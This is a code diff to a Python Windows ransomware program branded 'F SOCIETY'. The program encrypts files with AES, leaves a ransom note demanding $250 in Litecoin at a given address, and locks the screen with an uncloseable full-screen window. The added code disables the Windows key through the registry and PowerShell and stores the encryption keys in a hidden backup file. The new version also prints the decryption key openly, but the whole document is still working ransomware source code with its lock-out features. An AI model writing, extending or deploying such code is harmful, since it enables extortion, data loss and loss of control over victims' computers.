@@ -21,6 +21,10 @@ LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
 
+# --- Global storage for key/iv ---
+encryption_key = None
+encryption_iv = None
+
 # --- Core Encryption Functions ---
 def generate_key():
     return get_random_bytes(32)
@@ -205,7 +209,7 @@ Key: {key_hex}
 IV:  {iv_hex}
 
 TO DECRYPT:
-Run this program and enter the decryption key.
+Run this program and enter the decryption key: {DECRYPT_KEY}
 
 =============================================================
             F SOCIETY - WE ARE EVERYWHERE
@@ -214,12 +218,20 @@ Run this program and enter the decryption key.
     desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
+    
+    # Also save to a hidden file for backup decryption
+    hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
+    with open(hidden_path, 'w') as f:
+        f.write(f"{key_hex}\n{iv_hex}\n{DECRYPT_KEY}")
 
 def run_encryption():
     """Run encryption in background thread"""
+    global encryption_key, encryption_iv
     try:
         key = generate_key()
         iv = generate_iv()
+        encryption_key = key
+        encryption_iv = iv
         key_hex = base64.b64encode(key).decode()
         iv_hex = base64.b64encode(iv).decode()
         
@@ -247,6 +259,37 @@ def run_encryption():
     except:
         pass
 
+# --- Lock Windows Key ---
+def lock_windows_key():
+    """Disable the Windows key using registry"""
+    try:
+        # Disable Windows key via registry
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        try:
+            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
+        except:
+            handle = winreg.CreateKey(key, subkey)
+        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(handle)
+        
+        # Also disable via keyboard layout (method 2)
+        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 1"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
+
+def unlock_windows_key():
+    """Re-enable the Windows key"""
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(handle)
+        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 0"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    except:
+        pass
+
 # --- Full-Screen Decryption UI with fsociety Mask ---
 class RansomwareUI:
     def __init__(self, root):
@@ -255,6 +298,9 @@ class RansomwareUI:
         self.root.attributes('-fullscreen', True)
         self.root.attributes('-topmost', True)
         self.root.configure(bg='black')
+        
+        # Lock Windows key
+        lock_windows_key()
         
         # Prevent closing
         self.root.protocol("WM_DELETE_WINDOW", lambda: None)
@@ -275,6 +321,13 @@ class RansomwareUI:
         
         # Run encryption in background after UI shows
         self.root.after(100, self.start_encryption)
+    
+    def __del__(self):
+        # Unlock Windows key when window closes
+        try:
+            unlock_windows_key()
+        except:
+            pass
     
     def create_widgets(self):
         # Main container
@@ -323,11 +376,11 @@ class RansomwareUI:
                               fg='red', bg='black', justify='center')
         mask_label.pack(pady=10)
         
-        # Info text
+        # Info text - show the decryption key prominently
         info = f"""
         Your files are encrypted with AES-256-CBC.
         
-        To decrypt your files, enter the decryption key below.
+        DECRYPTION KEY: {DECRYPT_KEY}
         
         Litecoin Address: {LTC_ADDRESS}
         Amount: {RANSOM_AMOUNT}
@@ -509,6 +562,7 @@ class RansomwareUI:
         self.root.update()
     
     def decrypt_action(self):
+        global encryption_key, encryption_iv
         key_input = self.key_entry.get().strip()
         
         if not key_input:
@@ -524,61 +578,95 @@ class RansomwareUI:
         self.root.update()
         
         try:
-            # Read key/iv from ransom note
+            # First try to use the stored key from memory
+            if encryption_key is not None and encryption_iv is not None:
+                self.update_status("[+] Using stored key from memory...")
+                count = decrypt_all_files(encryption_key, encryption_iv)
+                if count > 0:
+                    self.update_status(f"[+] Decryption complete! {count} files restored.")
+                    self.finish_decryption()
+                    return
+            
+            # Try to read from hidden backup file
+            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
+            if os.path.exists(hidden_path):
+                self.update_status("[+] Reading key from backup file...")
+                with open(hidden_path, 'r') as f:
+                    lines = f.readlines()
+                    if len(lines) >= 3:
+                        key_hex = lines[0].strip()
+                        iv_hex = lines[1].strip()
+                        stored_key = lines[2].strip()
+                        if stored_key == DECRYPT_KEY:
+                            key = base64.b64decode(key_hex)
+                            iv = base64.b64decode(iv_hex)
+                            count = decrypt_all_files(key, iv)
+                            self.update_status(f"[+] Decryption complete! {count} files restored.")
+                            self.finish_decryption()
+                            return
+            
+            # Try to read from ransom note
             desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
             note_path = desktop + '\\README_FSOCIETY.txt'
             
-            if not os.path.exists(note_path):
-                self.update_status("[-] Ransom note not found. Cannot decrypt.")
-                return
+            if os.path.exists(note_path):
+                self.update_status("[+] Reading key from ransom note...")
+                with open(note_path, 'r') as f:
+                    content = f.read()
+                    key_match = re.search(r'Key: (\S+)', content)
+                    iv_match = re.search(r'IV: (\S+)', content)
+                    
+                    if key_match and iv_match:
+                        key = base64.b64decode(key_match.group(1))
+                        iv = base64.b64decode(iv_match.group(1))
+                        count = decrypt_all_files(key, iv)
+                        self.update_status(f"[+] Decryption complete! {count} files restored.")
+                        self.finish_decryption()
+                        return
             
-            with open(note_path, 'r') as f:
-                content = f.read()
-                key_match = re.search(r'Key: (\S+)', content)
-                iv_match = re.search(r'IV: (\S+)', content)
-                
-                if not key_match or not iv_match:
-                    self.update_status("[-] Could not find encryption key in note.")
-                    return
-                
-                key = base64.b64decode(key_match.group(1))
-                iv = base64.b64decode(iv_match.group(1))
-            
-            self.update_status("[+] Key and IV extracted. Decrypting files...")
-            
-            # Decrypt all files
-            count = decrypt_all_files(key, iv)
-            self.update_status(f"[+] Decryption complete! {count} files restored.")
-            
-            # Remove ransom note
-            try:
-                os.remove(note_path)
-                self.update_status("[+] Ransom note removed.")
-            except:
-                pass
-            
-            # Change wallpaper back
-            try:
-                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
-                self.update_status("[+] Wallpaper restored.")
-            except:
-                pass
-            
-            # Stop timer
-            if self.timer_id:
-                self.root.after_cancel(self.timer_id)
-            self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
-            
-            messagebox.showinfo("Success", f"Decryption complete!\n{count} files restored.")
-            self.update_status("[+] You can now close this window.")
+            self.update_status("[-] Could not find encryption key. Decryption failed.")
+            messagebox.showerror("Error", "Could not find encryption key. The key file may have been deleted.")
             
         except Exception as e:
             self.update_status(f"[-] Decryption error: {str(e)}")
             messagebox.showerror("Error", f"Decryption failed: {str(e)}")
+    
+    def finish_decryption(self):
+        """Clean up after successful decryption"""
+        # Remove ransom note
+        try:
+            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
+            os.remove(desktop + '\\README_FSOCIETY.txt')
+        except:
+            pass
+        
+        # Remove backup key
+        try:
+            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
+            os.remove(hidden_path)
+        except:
+            pass
+        
+        # Change wallpaper back
+        try:
+            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
+            self.update_status("[+] Wallpaper restored.")
+        except:
+            pass
+        
+        # Stop timer
+        if self.timer_id:
+            self.root.after_cancel(self.timer_id)
+        self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
+        
+        # Unlock Windows key
+        unlock_windows_key()
+        
+        messagebox.showinfo("Success", "Decryption complete! Your files have been restored.")
+        self.update_status("[+] You can now close this window.")
 
 # --- Main Entry Point ---
 def main():
-    # Always run UI
     root = tk.Tk()
     app = RansomwareUI(root)
     root.mainloop()
